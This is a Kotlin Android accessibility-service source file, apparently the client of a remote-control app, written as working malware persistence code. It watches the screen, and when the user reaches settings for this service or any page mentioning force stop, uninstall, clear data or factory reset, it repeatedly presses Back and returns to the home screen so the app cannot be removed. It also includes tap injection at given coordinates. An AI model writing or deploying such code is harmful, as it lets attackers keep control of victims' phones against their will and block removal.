package com.example.bullsseeclient

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.graphics.Rect
import android.os.Build
import java.nio.charset.Charset

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var Auto_Click = false // Changed from val to var
        var bypass = false     // Changed from val to var
    }

    override fun onServiceConnected() {
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
            flags = AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
        }
        serviceInfo = info
        Log.d("MyAccessibilityService", "Service connected")
        redirectToAccessibilitySettings()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null || bypass) return

        val eventText = getEventText(event).lowercase()
        val className = event.className?.toString()?.lowercase() ?: ""
        val packageName = event.packageName?.toString() ?: ""
        val serviceLabel = getStringResource(this, R.string.accessibility_service_label).lowercase()

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.ICE_CREAM_SANDWICH) {
            when {
                className == "com.android.settings.SubSettings" && eventText.contains(serviceLabel) -> {
                    blockBack()
                    sendHome(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                eventText.containsAny(
                    listOf(
                        "force stop", "delete app data", "clear data", "clear all data",
                        "app data", "clear cache", "uninstall", "remove", "backup & reset",
                        "erase all data", "reset phone", "phone options"
                    )
                ) -> {
                    blockBack()
                    sendHome(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                eventText.contains(serviceLabel) && eventText.contains("uninstall") -> {
                    blockBack()
                    sendHome(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                (eventText.contains("إيقاف") || eventText.contains("stop")) && eventText.contains(serviceLabel) -> {
                    blockBack()
                    sendHome(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                packageName.contains("com.google.android.packageinstaller") && className.contains("android.app.alertdialog") && eventText.contains(serviceLabel) -> {
                    blockBack()
                    sendHome(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                (packageName == "com.android.settings" || packageName == "com.miui.securitycenter") && eventText.contains(serviceLabel) &&
                        !listOf("android.support.v7.widget.recyclerview", "android.widget.linearlayout", "android.widget.framelayout").contains(className) -> {
                    blockBack()
                    sendHome(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
            }
        }
    }

    override fun onInterrupt() {
        Log.d("MyAccessibilityService", "Service interrupted")
    }

    private fun getEventText(event: AccessibilityEvent): String {
        return event.text?.toString() ?: ""
    }

    private fun getStringResource(context: Context, resId: Int): String {
        return try {
            context.resources.getString(resId)
        } catch (e: Exception) {
            Log.e("MyAccessibilityService", "Error getting string resource: ${e.message}")
            ""
        }
    }

    private fun clickAtPosition(x: Int, y: Int, nodeInfo: AccessibilityNodeInfo?, depth: Int = 0) {
        if (nodeInfo == null || depth > 50) return // Limit recursion depth
        try {
            if (nodeInfo.childCount == 0) {
                val rect = Rect()
                nodeInfo.getBoundsInScreen(rect)
                if (rect.contains(x, y) && Auto_Click) {
                    nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }
                return
            }
            val rect = Rect()
            nodeInfo.getBoundsInScreen(rect)
            if (rect.contains(x, y) && Auto_Click) {
                nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
            for (i in 0 until nodeInfo.childCount) {
                clickAtPosition(x, y, nodeInfo.getChild(i), depth + 1)
            }
        } catch (e: Exception) {
            Log.e("MyAccessibilityService", "Click error: ${e.message}")
        }
    }

    fun click(x: Int, y: Int) {
        try {
            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN) {
                clickAtPosition(x, y, rootInActiveWindow)
            }
        } catch (e: Exception) {
            Log.e("MyAccessibilityService", "Click error: ${e.message}")
        }
    }

    private fun blockBack() {
        try {
            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.ICE_CREAM_SANDWICH) {
                repeat(4) { performGlobalAction(GLOBAL_ACTION_BACK) }
            }
        } catch (e: Exception) {
            Log.e("MyAccessibilityService", "Block back error: ${e.message}")
        }
    }

    private fun sendHome(flags: Int) {
        try {
            val intent = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                setFlags(flags)
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e("MyAccessibilityService", "Send home error: ${e.message}")
        }
    }

    private fun redirectToAccessibilitySettings() {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            Log.d("MyAccessibilityService", "Redirected to accessibility settings")
        } catch (e: Exception) {
            Log.e("MyAccessibilityService", "Error redirecting to accessibility settings: ${e.message}")
        }
    }

    fun getAppNameFromPkgName(context: Context, packageName: String): String {
        return try {
            val packageManager = context.packageManager
            val appInfo = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(appInfo).toString()
        } catch (e: PackageManager.NameNotFoundException) {
            Log.e("MyAccessibilityService", "Error getting app name: ${e.message}")
            ""
        }
    }

    fun toBase64(input: String): String? {
        return try {
            android.util.Base64.encodeToString(input.toByteArray(Charset.forName("UTF-8")), android.util.Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.e("MyAccessibilityService", "Error converting to Base64: ${e.message}")
            null
        }
    }

    private fun String.containsAny(strings: List<String>): Boolean {
        return strings.any { this.contains(it.lowercase()) }
    }
}